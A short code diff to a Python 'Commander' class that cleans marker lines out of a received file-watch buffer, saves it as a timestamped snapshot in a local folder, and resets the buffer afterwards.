@@ -184,30 +184,34 @@ class Commander:
         """Save received watched file to ./watched/ folder with timestamp."""
         if not self.watch_current_file:
             return
-        
+
         watch_dir = "./watched"
         os.makedirs(watch_dir, exist_ok=True)
-        
-        # Create timestamped snapshot
+
         ts = datetime.now().strftime("%Y%m%d_%H%M%S")
         rel_path = Path(self.watch_current_file)
         snapshot_name = f"{rel_path.stem}_{ts}{rel_path.suffix}"
         save_path = os.path.join(watch_dir, snapshot_name)
-        
-        # Extract content by removing markers
+
         content = self.watch_buffer
+
         content = re.sub(r'\[WATCH FILE\] .+?\n', '', content)
         content = re.sub(r'\[EVENT\] \d+\n', '', content)
         content = re.sub(r'\[SIZE\] \d+\n', '', content)
-        content = re.sub(r'\[WATCH END\] .+?\n', '', content)
-        
+        content = re.sub(r'\[WATCH END\].*', '', content)
+
         try:
             with open(save_path, "w") as f:
                 f.write(content)
+
             evt_name = self.EVT_NAMES.get(self.watch_event_type, "MODIFIED")
             print(f"\n[+] Watched file saved: {save_path} ({evt_name})")
+
         except Exception as e:
             print(f"\n[!] Error saving watched file: {e}")
+
+        # Reset buffer to avoid corruption
+        self.watch_buffer = ""
 
     def display_output(self, timeout=3):
         """Wait for and display buffered output."""
